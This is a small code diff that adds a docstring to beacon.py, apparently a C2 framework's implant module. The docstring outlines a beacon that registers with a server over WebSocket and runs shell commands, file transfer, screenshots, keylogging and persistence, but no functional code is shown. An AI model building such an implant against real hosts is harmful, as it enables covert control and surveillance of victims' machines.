@@ -1,6 +1,19 @@
 """
 AngelaMos | 2026
 beacon.py
+
+Standalone implant that connects to the C2 server and executes tasks
+
+Self-contained beacon implant. Connects to the server over WebSocket,
+sends a REGISTER message with host metadata, then concurrently runs a
+heartbeat loop and a task receive loop. Handles all C2 commands
+locally (shell, sysinfo, proclist, upload, download, screenshot,
+keylogging, persistence, sleep configuration) and sends results back.
+Reconnects with exponential backoff on failure.
+
+Key exports:
+  BeaconConfig - runtime configuration dataclass
+  main - async entry point for the beacon loop
 """
 
 import asyncio
